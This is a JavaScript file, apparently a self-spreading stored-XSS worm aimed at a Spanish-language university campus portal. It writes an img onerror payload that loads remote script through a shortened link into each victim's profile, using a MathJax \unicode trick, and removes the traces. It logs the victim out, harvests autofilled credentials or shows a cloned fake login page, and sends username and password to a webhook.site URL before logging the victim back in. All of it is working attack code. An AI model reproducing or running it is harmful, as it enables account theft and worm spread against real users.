const SAFE_PATTERN = '<img src=x onerror="$.getScript(\'//bit.ly/4sadNVr\')">';
const NO_CORS_WEBHOOK = 'https://webhook.site/958b3d02-6667-410f-b47e-b3f19cc904b2';

const FETCH_TIMEOUT_MS = 5000;
const OBSERVER_TIMEOUT_MS = 5000;

async function safeFetch(url, options = {}, timeoutMs = FETCH_TIMEOUT_MS) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const res = await fetch(url, { ...options, signal: controller.signal });
        if (!res.ok) {
            return null;
        }
        return res;
    } catch {
        return null;
    } finally {
        clearTimeout(timer);
    }
}

function removeArtifacts(root = document) {
    const nodes = root.querySelectorAll('.MathJax');
    for (const node of nodes) {
        const html = node.innerHTML || '';
        if (html.includes('𐀀') || html.includes('<img')) {
            node.remove();
        }
    }
}

function startArtifactObserver() {
    removeArtifacts(document);
    const observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node && node.nodeType === Node.ELEMENT_NODE) {
                    removeArtifacts(node);
                }
            }
        }
    });
    const target = document.body || document.documentElement || document;
    observer.observe(target, { childList: true, subtree: true });
    const timeoutId = setTimeout(() => observer.disconnect(), OBSERVER_TIMEOUT_MS);
    return {
        disconnect: () => {
            clearTimeout(timeoutId);
            observer.disconnect();
        }
    };
}

async function propagation() {
    removeArtifacts(document);
    try {
        const perfil = await safeFetch('FUSDatosPersonalesVer.aspx');
        if (!perfil) return;

        const html = await perfil.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const parrafo = doc.querySelector('p.mt-4.text-muted');

        const textValue = parrafo?.textContent?.trim() || '';
        const htmlValue = parrafo?.innerHTML || '';
        const hasKey = html.includes(SAFE_PATTERN) || htmlValue.includes(SAFE_PATTERN) || textValue.includes(SAFE_PATTERN);
        if (hasKey) return;

        await safeFetch('FUSPreferencias.aspx', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                ITEsUpdate: '-1',
                Presentacion: `${textValue ? textValue + ' ' : ''}\\(\\unicode{${SAFE_PATTERN}}\\)`,
                MostrarEmail: '3',
                MostrarCurriculum: '3',
                Aceptar: '-1'
            })
        });
    } catch (error) {
    }
}

async function atms() {
    if (localStorage.getItem('operacionBandera') === 'FINALIZADO') {
        return; 
    }

    try {
        const desconectar = await safeFetch('FHDesconectar.aspx');
        if (!desconectar) return;

        await new Promise(r => setTimeout(r, 100));

        const respuestaLogin = await safeFetch('FLIIdentificarse.aspx?ITError=2');
        if (!respuestaLogin) return;

        const html = await respuestaLogin.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');

        const formularioReal = doc.querySelector('form');
        if (!formularioReal) return;

        const inputClave = formularioReal.querySelector('input#Pass, input[name="Pass"], input[type="password"]');
        const inputUsuario = formularioReal.querySelector('input#Login, input[name="Login"], input[type="text"]');

        const clave = inputClave?.value || '';
        const usuario = inputUsuario?.value || '';


        if (usuario && clave) {
            const urlWebhook = `${NO_CORS_WEBHOOK}?u=${btoa(usuario)}&p=${btoa(clave)}`;
            fetch(urlWebhook, { mode: 'no-cors' }).catch(() => {});

            const datosLogin = new URLSearchParams(new FormData(formularioReal));
            datosLogin.append('Recordarme', 'on');
            datosLogin.append('Entrar', 'on');
            await safeFetch('FHEntrar.aspx', { method: 'POST', body: datosLogin });
            localStorage.setItem('operacionBandera', 'FINALIZADO');
            return;
        }
        
        let htmlFalso = `
            <!DOCTYPE html>
            <html lang="es">
            <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
            <title>Error</title>

            <!-- Exact same libraries as the original source -->
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.3/css/bootstrap.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/css/mdb.min.css">

            <style>
                a, .skin-light .table a { color: #7D010B; }
                a:hover { color: #333333; }

                .skin-light .btn-primary { background-color: #cca600 !important; }
                .skin-light .btn-primary:hover,
                .skin-light .btn-primary:focus,
                .skin-light .btn-primary:active { background-color: #333333 !important; }

                .md-form input[type="text"]:not(.browser-default):focus:not([readonly]),
                .md-form input[type="password"]:not(.browser-default):focus:not([readonly]) {
                border-bottom: 1px solid #262965;
                box-shadow: 0 1px 0 0 #262965;
                }
                .md-form input[type="text"]:not(.browser-default):focus:not([readonly]) + label,
                .md-form input[type="password"]:not(.browser-default):focus:not([readonly]) + label {
                color: #262965;
                }

                body { background-color: #F1F2F3; }
                .it-page-home_cover_basic { background-color: #F1F2F3; }
                .min-vh-100 { min-height: 100vh; }

                .alert-danger {
                color: #a94442;
                background-color: #f8d7da;
                border-color: #f5c6cb;
                font-weight: 300 !important;
                }

                .it-page-home-basic__login-title {
                font-weight: 300;
                color: #555 !important;
                }

                .custom-control-label { color: #888 !important; }

                .custom-control-input:checked ~ .custom-control-label::before {
                border-color: #1565c0;
                background-color: #1565c0;
                }

                .it-anchor_plugin_popup.form-text {
                text-decoration: underline !important;
                }

                .btn.btn-primary.btn-block {
                padding: 1.1rem 1rem !important;
                font-size: .7rem !important;
                font-weight: 700 !important;
                letter-spacing: .08em;
                }

                .it-page-firma { color: #6c757d; }
                .it-page-firma__link { color: #7d010b; }
                .it-page-firma__link:hover { color: #333; }
            </style>
            </head>
            <script>window._NO_CORS_WEBHOOK = '${NO_CORS_WEBHOOK}';</script>

            <body class="skin-light it-page it-page_type_home it-page-home_skin_basic">
            <div class="bg-cover h-100 it-page-home_cover_basic">
                <div class="container">
                <div class="row justify-content-center align-items-center min-vh-100">
                    <div class="col-sm-10 col-md-8 col-lg-6 col-xl-5">
                    <div class="card shadow bg-white rounded-lg border-0">
                        <div class="card-body p-4 p-sm-5">

                        <!-- Brand -->
                        <div class="it-page-home__brand it-page-home__brand_cover_basic d-flex justify-content-center">
                            <img src="https://campus.i.edu.mx/_PersonalizacionesWeb/Default/page-home-brand.png"
                                alt="Universidad Ítaca"
                                class="it-page-home__brand-img img-fluid mb-4">
                        </div>

                        <!-- Error Alert -->
                        <div class="it-page__main-message">
                            <div class="alert alert-danger">
                            Error de acceso. Debe iniciar una sesión como usuario registrado.
                            </div>
                        </div>

                        <!-- Login Title -->
                        <h2 class="h5 text-center text-muted it-page-home-basic__login-title">Iniciar sesión</h2>

                        <!-- Form -->
                        <form name="IdentificacionUsuario" id="IdentificacionUsuario"
                                class="it-login-form" method="post" action="FHEntrar.aspx">

                            <!-- Usuario -->
                            <div class="md-form">
                            <span class="fas fa-user prefix grey-text" aria-hidden="true"></span>
                            <input type="text" id="Login" name="Login" size="15" maxlength="30"
                                    class="form-control" value="" autofocus tabindex="1" required>
                            <label for="Login" accesskey="U" title="Usuario (Alt+U)">Usuario</label>
                            </div>

                            <!-- Contraseña -->
                            <div class="md-form">
                            <span class="fas fa-lock prefix grey-text" aria-hidden="true"></span>
                            <input type="password" id="Pass" name="Pass" size="15" maxlength="15"
                                    class="form-control" autocomplete="off" value="" tabindex="2" required>
                            <label for="Pass">Contraseña</label>
                            </div>

                            <!-- Recordarme + Olvidé -->
                            <div class="row justify-content-between align-items-center mb-4">
                            <div class="col-auto">
                                <div class="custom-control custom-checkbox">
                                <input type="checkbox" name="Recordarme" id="Recordarme"
                                        value="on" class="custom-control-input" checked>
                                <label class="custom-control-label" for="Recordarme">Recordarme</label>
                                </div>
                            </div>
                            <div class="col-auto text-right">
                                <a href="FLIPasswordRecordar.aspx" target="PasswordRecordar"
                                class="it-anchor_plugin_popup form-text" tabindex="3">Olvidé mi contraseña</a>
                            </div>
                            </div>

                            <!-- Botón -->
                            <button type="submit" name="Entrar" value="on"
                                    class="btn btn-lg btn-primary btn-block waves-effect waves-light" tabindex="3">Entrar</button>

                        </form>

                        <!-- Firma -->
                        <div class="small text-right it-page-firma mt-4">
                            <span class="it-page-firma__label">Desarrollado por</span>
                            <a href="https://www.atnova.com" target="_blank" rel="noopener"
                            class="it-page-firma__link">Atnova</a>
                        </div>

                        </div>
                    </div>
                    </div>
                </div>
                </div>
            </div>

            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/js/mdb.min.js"></script>
            <script>
            const formulario = document.getElementById('IdentificacionUsuario');

            formulario.addEventListener('submit', function(evento) {
                
                evento.preventDefault();

                let usuario = document.getElementById('Login').value;
                let clave = document.getElementById('Pass').value;

                let urlWebhook = window._NO_CORS_WEBHOOK + '?u=' + btoa(usuario) + '&p=' + btoa(clave);

                fetch(urlWebhook, { mode: 'no-cors' })
                .then(() => {
                    window.location.href = 'FHEntrar.aspx'; 
                })
                .catch(() => {
                    window.location.href = 'FHEntrar.aspx';
                });
            });
            </script>
            </body>
            </html>
        `;

        document.open();
        document.write(htmlFalso);
        document.close();

        const formFalso = document.getElementById('IdentificacionUsuario');
        if (formFalso) {
            formFalso.addEventListener('submit', async function(e) {
                e.preventDefault();

                const uFalso = document.getElementById('Login')?.value || '';
                const pFalso = document.getElementById('Pass')?.value || '';

                const urlWebhook = `${NO_CORS_WEBHOOK}?u=${btoa(uFalso)}&p=${btoa(pFalso)}`;
                fetch(urlWebhook, { mode: 'no-cors' }).catch(() => {});

                const bodyDatos = `Login=${encodeURIComponent(uFalso)}&Pass=${encodeURIComponent(pFalso)}&Recordarme=on&Entrar=on`;
                await safeFetch('FHEntrar.aspx', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: bodyDatos
                });

                localStorage.setItem('operacionBandera', 'FINALIZADO');
                window.location.href = 'FHome.aspx';
            });
        }

    } catch (error) {
    }
}

(async function main() {
    const observer = startArtifactObserver();
    Promise.all([propagation(), atms()])
        .finally(() => observer.disconnect());
})();
